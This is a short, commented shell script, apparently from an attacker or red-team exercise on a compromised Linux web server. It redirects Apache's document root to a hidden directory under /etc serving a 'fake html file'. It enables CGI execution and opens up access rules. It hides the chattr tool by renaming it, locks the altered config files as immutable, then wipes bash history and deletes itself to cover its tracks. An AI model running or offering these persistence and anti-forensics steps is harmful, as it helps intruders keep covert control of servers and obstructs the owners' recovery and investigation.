#Script.sh:

#Redirect the document root to the directory hosting the fake html file
sudo sed -i 's|/var/www/html|/etc/libnl-3|' /etc/apache2/sites-available/000-default.conf

#Allow apache2 to run the fake html file
sudo sed -i 's|Options FollowSymLinks|Options Indexes FollowSymLinks Includes ExecCGI|' /etc/apache2/apache2.conf
sudo sed -i 's|AllowOverride None|AllowOverride All|' /etc/apache2/apache2.conf
sudo sed -i 's|Require all denied|Require all granted|' /etc/apache2/apache2.conf

#Restart Apache server
sudo service apache2 restart

#Moving chattr under another command
sudo mv /usr/bin/chattr /usr/bin/beaver

#Making the 000-default and apache2 conf immutable
sudo beaver +i /etc/apache2/apache2.conf
sudo beaver +i /etc/apache2/sites-available/000-default.conf

#Covering my tracks and deleting the original file
echo "" > .bash_history
rm script.sh
